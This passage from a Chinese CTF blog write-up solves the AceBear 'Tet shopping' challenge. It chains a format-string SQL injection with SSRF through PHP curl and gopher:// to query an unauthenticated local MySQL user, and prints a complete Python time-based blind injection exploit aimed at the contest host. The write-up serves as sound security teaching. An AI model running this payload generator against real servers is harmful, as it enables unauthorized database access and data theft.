class="string">'$flag'</span>);</div><div class="line">SQL</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"[+] backup successful"</span></div></pre></td></tr></table></figure></p>
+<p>flag存放在数据库<code>flag</code>的<code>flag</code>表的<code>flag</code>字段中，其用户为<code>fl4g_m4n4g3r</code>，暂时我们没有权限访问。并且我们可以注意到，数据库用户<code>fl4g_m4n4g3r</code>并没有设置密码，这就可能存在未授权访问漏洞。</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>在info.php的最后一行，执行了<code>watermark_me($result[0][&#39;img&#39;])</code>，<code>$result[0][&#39;img&#39;]</code>是基于前面sql查询语句查询结果，由前sql注入分析知这个参数是我们可以控制的。<code>watermark_me()</code>定义在func.php中，相关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_data</span><span class="params">($url)</span> </span>&#123;</div><div class="line">	$ch = curl_init();</div><div class="line">	$timeout = <span class="number">2</span>;</div><div class="line">	curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">	curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);</div><div class="line">	$data = curl_exec($ch);</div><div class="line">	curl_close($ch);</div><div class="line">	<span class="keyword">return</span> $data;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">watermark_me</span><span class="params">($img)</span></span>&#123;</div><div class="line">	<span class="keyword">if</span>(preg_match(<span class="string">'/^file/'</span>, $img))&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">"Ahihi"</span>);</div><div class="line">	&#125;</div><div class="line">	$file_content = get_data($img);</div><div class="line"></div><div class="line">	$fname = <span class="string">'tmp-img-'</span>.rand(<span class="number">0</span>,<span class="number">9</span>).<span class="string">'.tmp'</span>;</div><div class="line">	file_put_contents(<span class="string">'/tmp/'</span>.$fname, $file_content);</div><div class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line">	<span class="keyword">if</span>(file_exists(<span class="string">'/tmp/'</span>.$fname))</div><div class="line">		<span class="keyword">break</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	$stamp = imagecreatefromjpeg(<span class="string">'ok.jpg'</span>);</div><div class="line">	$imgPng = imagecreatefromjpeg(<span class="string">'/tmp/'</span>.$fname);</div><div class="line"></div><div class="line">	$marge_right = <span class="number">10</span>;</div><div class="line">	$marge_bottom = <span class="number">10</span>;</div><div class="line">	$sx = imagesx($stamp);</div><div class="line">	$sy = imagesy($stamp);</div><div class="line"></div><div class="line"></div><div class="line">	imagecopy($imgPng, $stamp, imagesx($imgPng) - $sx - $marge_right, imagesy($imgPng) - $sy - $marge_bottom, <span class="number">0</span>, <span class="number">0</span>, imagesx($stamp), imagesy($stamp));</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($imgPng)&#123;</div><div class="line">		@unlink(<span class="string">'/tmp/'</span>.$fname);</div><div class="line">		<span class="comment">//header("Content-type: image/png");</span></div><div class="line">		ob_start();</div><div class="line">		imagePng($imgPng);</div><div class="line">		$imagedata = base64_encode(ob_get_contents());</div><div class="line"></div><div class="line">		ob_end_clean();</div><div class="line">		@imagedestroy($imgPng);</div><div class="line">		<span class="keyword">return</span> $imagedata;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		@unlink(<span class="string">'/tmp/'</span>.$fname);</div><div class="line">		<span class="keyword">die</span>(<span class="string">"Ahihi"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>先检查<code>$img</code>是否已<code>file</code>开头，若不是则调用<code>get_data()</code>，之后创建文件并返回。而<code>get_data()</code>里是<code>curl</code>操作，很容易联想到SSRF攻击。结合前面的sql漏洞，以及对应的backup.sh，可以想到这篇<a href="https://mp.weixin.qq.com/s/9vk-H36erencugdYca9qXA" target="_blank" rel="external">SSRF To RCE in MySQL </a>中提到的技巧。</p>
+<p>通过sql注入漏洞，我们可以控制<code>$result[0][&#39;img&#39;]</code>为<code>gopher://127.0.0.1:3306/_ + payload</code> ，即可在<code>get_data()</code>中利用<code>curl</code>和gopher协议对mysql进行未授权访问，payload中填上我们要执行的sql语句，包括登陆，查询，以及退出。由于这个方法返回的是二进制数据，而不是普通的数据，因此无法根据返回页面的内容来进行布尔注入。本地测试如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/8.jpg?raw=true" alt=""></p>
+<p>但由于可以执行sql语句，因此我们可以进行基于时间的盲注。</p>
+<p>首先用wrieshark抓包，获取到登陆以及对应执行的raw数据：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/7.jpg?raw=true" alt=""></p>
+<p>由于是未授权访问，因此raw数据的认证部分其实是相同的，可以不用修改。而要执行的sql语句需要根据情况来变化，在wireshark中找到对应的位置：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/10.jpg?raw=true" alt=""></p>
+<p>以上图为例，选取的部分是sql语句，之前有一个固定字段<code>00000003</code>，再之前的<code>13</code>是sql语句的长度加一后的十六进制值，这里sql语句长度为18，加一为19，也即19=1 * 16 + 3 即 hex(19) = 13。这样我们能生成攻击的gopher协议的payload了。</p>
+<p>接着考虑如何与前面的sql格式化字符串结合起来，如图所示，利用单引号逃逸和<code>union select</code>控制了第三个字段值：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/11.jpg?raw=true" alt=""></p>
+<p>为演示和防止编码问题，将<code>gopher://127.0.0.1:3306/_%b6</code>编码为十六进制<code>0x676f706865723a2f2f3132372e302e302e313a333330362f5f256236</code>，mysql在接受后会自动的解码还原，<code>%</code>在此过程中不会丢失，这样在之后的curl操作中得以进行。</p>
+<p>最终利用脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> binascii</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_hex</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> str(hex(data)).replace(<span class="string">'0x'</span>,<span class="string">''</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">(query)</span>:</span></div><div class="line">	enc_query = <span class="string">''</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> query:</div><div class="line">		enc_query += str_hex(ord(i))</div><div class="line">	<span class="keyword">return</span> enc_query</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_payload</span><span class="params">(query)</span>:</span></div><div class="line">	payload = <span class="string">'b600000185a23f0000000001210000000000000000000000000000000000000000000000666c34675f6d346e3467337200006d7973716c5f6e61746976655f70617373776f72640071035f6f731064656269616e2d6c696e75782d676e750c5f636c69656e745f6e616d65086c69626d7973716c045f70696404323833360f5f636c69656e745f76657273696f6e0731302e312e3233095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c'</span></div><div class="line">	payload += <span class="string">'210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d69742031'</span></div><div class="line"></div><div class="line">	payload += str_hex(len(query)+<span class="number">1</span>)</div><div class="line">	payload += <span class="string">'00000003'</span></div><div class="line">	payload += encode(query)</div><div class="line">	payload += <span class="string">'0100000001'</span></div><div class="line">	<span class="keyword">return</span> payload</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">(payload)</span>:</span></div><div class="line">	result = [payload[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(payload),<span class="number">2</span>)]</div><div class="line">	<span class="keyword">return</span> binascii.b2a_hex(<span class="string">b"gopher://127.0.0.1:3306/_%"</span>+<span class="string">"%"</span>.join(result))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	i = <span class="number">1</span></div><div class="line">	flag = <span class="string">""</span></div><div class="line">	url = <span class="string">"http://128.199.179.156/info.php"</span></div><div class="line">	cookie = &#123;</div><div class="line">		<span class="string">'PHPSESSID'</span>:<span class="string">'av7963h17c1qukv4jm4gklvoi1'</span></div><div class="line">	&#125;</div><div class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">127</span>,<span class="number">32</span>,<span class="number">-1</span>):</div><div class="line">			<span class="keyword">print</span> <span class="string">'j:'</span>+str(j)</div><div class="line">			query = <span class="string">"select * from flag.flag where IF(ascii(substr((select * from flag.flag),%s,1)) =%s,sleep(5),1);"</span> % (str(i),str(j))</div><div class="line">			uid = <span class="string">"?uid=%1$'%20union%20select%201,1,0x"</span> + result(gen_payload(query)) + <span class="string">"%23"</span></div><div class="line">			fullurl = url + uid</div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				r = requests.get(fullurl,cookies=cookie,timeout=<span class="number">5</span>)</div><div class="line">			<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">				flag += chr(j)</div><div class="line">				print(flag)</div><div class="line">				i = i+<span class="number">1</span></div><div class="line">				<span class="keyword">break</span></div><div class="line">	print(flag)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">	exp()</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/12.jpg?raw=true" alt=""></p>
+<p>访问：<a href="https://tinyurl.com/y9pplum3" target="_blank" rel="external">https://tinyurl.com/y9pplum3</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180131/13.jpg?raw=true" alt=""></p>
+<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AceBear&#123;Just_WP_SQLi_and_some_SSRF_tricks&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://paper.seebug.org/386/" target="_blank" rel="external">wordpress 格式化字符串sql注入漏洞</a></li>
+<li><a href="https://chybeta.github.io/2017/11/18/LCTF-2017-Simple-blog-writeup/#%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%B2sql%E6%B3%A8%E5%85%A5">LCTF 2017-Simple blog-writeup </a></li>
+<li><a href="https://mp.weixin.qq.com/s/9vk-H36erencugdYca9qXA" target="_blank" rel="external">SSRF To RCE in MySQL </a></li>
+</ul>
+
+      
+    </div>
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>本文标题:</span><a href="/2018/01/31/AceBear-Security-Contest-Tet-shopping-writeup/">AceBear Security Contest-Tet shopping-writeup</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
+  <p><span>发布时间:</span>2018年01月31日 - 10:01</p>
+  <p><span>最后更新:</span>2018年02月03日 - 19:02</p>
+  <p><span>原始链接:</span><a href="/2018/01/31/AceBear-Security-Contest-Tet-shopping-writeup/" title="AceBear Security Contest-Tet shopping-writeup">http://chybeta.github.io/2018/01/31/AceBear-Security-Contest-Tet-shopping-writeup/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chybeta.github.io/2018/01/31/AceBear-Security-Contest-Tet-shopping-writeup/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+
+      
+	</div>
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/wechat.jpg?raw=true" alt="chybeta WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/01/29/AceBear-Security-Contest-部分Web-writeup/" rel="next" title="AceBear Security Contest-部分Web-writeup">
+                <i class="fa fa-chevron-left"></i> AceBear Security Contest-部分Web-writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/3017/07/26/一些文章/" rel="prev" title="一些文章">
+                一些文章 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTAzNC81NjAz"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="chybeta" />
+          <p class="site-author-name" itemprop="name">chybeta</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+        
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">159</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">12</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">70</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/CHYbeta" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/chybeta" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-block">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://ph0en1x.com/" title="XMU-Ph0en1x" target="_blank">XMU-Ph0en1x</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://lxpark.com/" title="lzhtony" target="_blank">lzhtony</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.cnblogs.com/findneo/" title="findneo" target="_blank">findneo</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.madsome.cn" title="Mads" target="_blank">Mads</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://philhe.coding.me/" title="Philhe" target="_blank">Philhe</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#题目"><span class="nav-number">2.</span> <span class="nav-text">题目</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Solution"><span class="nav-number">3.</span> <span class="nav-text">Solution</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本功能"><span class="nav-number">3.1.</span> <span class="nav-text">基本功能</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#格式化字符串sql注入漏洞"><span class="nav-number">3.2.</span> <span class="nav-text">格式化字符串sql注入漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-number">3.3.</span> <span class="nav-text">SSRF</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">chybeta</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("unqDDYqYUADBUogKkMVqqvFH-gzGzoHsz", "afr1xO80LoKo0xCpxHJCleC4");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
